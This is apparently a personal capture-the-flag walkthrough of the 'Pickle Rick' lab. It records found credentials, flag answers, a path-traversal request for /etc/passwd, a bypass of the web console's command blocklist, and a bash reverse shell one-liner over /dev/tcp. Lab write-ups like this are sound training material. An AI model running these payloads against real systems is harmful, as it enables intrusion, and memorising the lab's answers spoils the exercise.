# Pickle Rick
A Rick and Morty CTF. Help turn Rick back into a human!

Machine ip
```
export IP=10.10.137.117
```

- Performing an nmap scan as my first line of movement.

- I found some pretty interesting things in the webpage's source
```
Username: R1ckRul3s
```

- found some interesting thing in the robots.txt file also
```
Wubbalubbadubdub
```

- I am using the local file inclusion attack style to gather info about the directory structure of the server. I am going back many times to see if i can access the /etc/passwd since the server is running linux.
```
http://$IP:80/?page=../../../../../../../../../../../etc/passwd
```
This method totally did not work :(.

- Apparently the directory scan was shallow so i'm going to do another scan and see what i'll see.
Found couple of php directories that are worth checking out. I found a 
```
portal.php
login.php
```
Ohhhh fuck! I had the username and a likely password and didn't even think to try it. Fuck me.

- I found some page that let's me execute a linux command in my current directory.
I viewed the source of the webpage and found a likely base64 encoded data that i am having a hard time decoding with my famous oneliner :).
`Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==`

- I got the first flag :D. Nobody should have this type of web console on their website. 
```
mr. meeseek hair
```
Never will i ever keep sensitive data in the `/var/www/html` directory of a webserver. Thats bad shit.
So i tried to read the source of the the `.php` files. The web console prevent me from using 
`("cat", "head", "more", "tail", "nano", "vim", "vi")`. But i remembered there is the use of strings to echo strings back to me, so i used that to get the source code of the webpages in the html directory. But they were not that helpful to getting the flags.

- Got the second flag by going to the traversing to `/home/rick` and found a `second ingredients` file that contained the second flag :( "juicy!".
Hmm looks like there is bash on the server, lemme try a classic bash reverse shell trick and see what happens :D.
`/bin/bash -c "bash -i >& /dev/tcp/$IP/9999 0>&1"`
I got a dumb reverse shell from the web server. I am trying to get a stable but i only know how to do that i python and the server doesn't run python soo i'll just keep looking.
